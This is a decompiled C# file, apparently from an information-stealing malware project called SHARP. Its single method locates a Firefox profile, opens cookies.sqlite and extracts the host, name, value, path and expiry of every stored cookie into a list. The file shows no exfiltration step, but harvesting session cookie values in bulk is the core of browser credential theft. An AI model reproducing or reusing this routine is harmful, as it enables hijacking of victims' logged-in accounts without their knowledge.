﻿using System;
using System.Collections.Generic;
using System.IO;

namespace SHARP.Cookies
{
	// Token: 0x02000074 RID: 116
	internal class Cookies
	{
		// Token: 0x06000284 RID: 644 RVA: 0x0000F91C File Offset: 0x0000DB1C
		public static List<Cookie> Get(string BrowserDir)
		{
			List<Cookie> list = new List<Cookie>();
			string profile = Profile.GetProfile(BrowserDir);
			if (profile == null)
			{
				return list;
			}
			SQLite sqlite = SQLite.ReadTable(Path.Combine(profile, "cookies.sqlite"), "moz_cookies");
			if (sqlite == null)
			{
				return list;
			}
			for (int i = 0; i < sqlite.GetRowCount(); i++)
			{
				list.Add(new Cookie
				{
					sHostKey = sqlite.GetValue(i, 4),
					sName = sqlite.GetValue(i, 2),
					sValue = sqlite.GetValue(i, 3),
					sPath = sqlite.GetValue(i, 5),
					sExpiresUtc = sqlite.GetValue(i, 6)
				});
			}
			return list;
		}
	}
}
